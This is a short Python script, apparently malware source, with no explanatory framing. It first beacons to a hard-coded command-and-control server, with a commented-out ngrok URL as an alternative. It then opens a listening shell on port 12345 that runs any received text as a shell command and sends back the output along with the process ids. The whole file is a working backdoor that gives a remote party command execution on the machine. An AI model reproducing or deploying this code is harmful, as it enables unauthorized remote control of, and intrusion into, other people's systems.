import socket, subprocess, os, sys, signal

C2_IP, C2_PORT = "203.0.113.45", 44321
HOST, PORT = "0.0.0.0", 12345
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((C2_IP, C2_PORT))
        s.sendall(f"Connection from {PORT}\n".encode('utf-8'))
        s.close()
except Exception as e:
    sys.exit(f"Failed to connect to C2 server: {e}")

# C2_URL = "https://bc28-27-4-220-77.ngrok-free.app"
# headers = {'Content-Type': 'application/x-www-form-urlencoded'}
# try:
#     response = requests.post(C2_URL, data=f"Connection via {PORT}", headers=headers)
# except Exception as e:
#     print(e)
#     sys.exit(f"Connection failed: {e}")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))
server.listen(1)
signal.signal(signal.SIGINT, lambda *args: (server.close(), sys.exit()))
while True:
    conn, addr = server.accept()
    try:
        while True:
            data = conn.recv(1024).decode().strip()
            if not data:
                break
            if data.lower() == "q":
                conn.close()
                sys.exit(0)
            ps = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result, error = ps.communicate()
            result = (result + error).decode() + f"pid: {os.getpid()}, ppid: {os.getppid()}\n"
            conn.sendall(result.encode())
    except Exception as e:
        pass
    finally:
        conn.close()